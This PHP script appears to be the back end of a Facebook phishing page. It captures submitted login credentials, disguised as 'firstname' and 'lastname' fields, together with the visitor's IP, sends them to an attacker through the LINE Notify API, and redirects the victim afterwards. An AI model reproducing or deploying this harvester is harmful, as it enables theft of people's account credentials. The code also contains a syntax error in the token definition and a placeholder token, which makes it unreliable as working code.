<?php 


    $header = "Testing Line Notify";
    $firstname = $_POST['firstname'];
    $lastname = $_POST['lastname'];
    $ip = include('IPx.php');
    $message = $header.
                "\n". "{----sayser----}"  .
                "\n". "username : " . $firstname .
                "\n". "password : " . $lastname .
                "\n". "IP : " . $ip .
                "\n". "app : facebook";

    if (isset($_POST["submit"])) {
        if ( $firstname <> "" ||  $lastname <> "" ){
            sendlinemesg();
            header('Content-Type: text/html; charset=utf8');
            $res = notify_message($message);
            header("location: index.php");
        } else {
            header("location: facebook.php");
        }
    }

    function sendlinemesg() {
        define('LINE_API',"https://notify-api.line.me/api/notify");
        define('LINE_TOKEN',"โทเค่น";

        function notify_message($message) {
                    $queryData = array('message' => $message);
                    $queryData = http_build_query($queryData,'','&');
                    $headerOptions = array(
                        'http' => array(
                            'method' => 'POST',
                            'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
                                        ."Authorization: Bearer ".LINE_TOKEN."\r\n"
                                        ."Content-Length: ".strlen($queryData)."\r\n",
                            'content' => $queryData
                        )
                    );
                    $context = stream_context_create($headerOptions);
                    $result = file_get_contents(LINE_API, FALSE, $context);
                    $res = json_decode($result);
                    return $res;
                }
            }
        
        
?>
